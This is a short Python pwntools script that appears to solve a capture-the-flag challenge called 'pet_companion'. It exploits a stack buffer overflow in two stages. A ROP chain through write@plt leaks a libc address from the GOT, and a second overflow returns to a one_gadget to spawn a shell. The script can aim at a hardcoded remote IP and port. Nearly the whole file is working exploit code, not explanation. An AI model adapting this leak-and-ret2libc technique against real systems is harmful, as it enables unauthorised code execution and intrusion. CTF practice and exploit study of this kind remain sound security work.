#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("pet_companion")
libc = ELF(elf.runpath + b"/libc.so.6")

# Defining the GDB script that will be used when running the binary with the GDB parameter
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("94.237.53.58", 49979)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

#=-=-=- USE BOF TO LEAK LIBC -=-=-=

pop_rsi_r15 = 0x400741
# Set the first argument of the write function in register RSI
# as the address of the same write function to leak its address,
# set R15 to any value, then call write function and finally
# call main to use BOF again later
payload = b"A"*72 + \
          p64(pop_rsi_r15) + p64(elf.got.write) + p64(0x0) + \
          p64(elf.plt.write) + \
          p64(elf.sym.main)
io.sendlineafter(b": ", payload)
data =  io.recvuntil(b'[!] Set your pet companion\'s current status: ')
# Extract the write address from the response and calculate the
# libc base address by subtracting the write function offset
# to the leaked address
libc.address = u64(data[21:29]) - libc.sym.write
info("libc @ 0x%x", libc.address)


#=-=-=- USE BOF AGAIN TO DO A RET2LIBC ATTACK -=-=-=

# Call a one gadget from libc
io.sendline(b"A"*72 + p64(libc.address + 0x4f302))

#============================================================

# Interact with the process
io.interactive()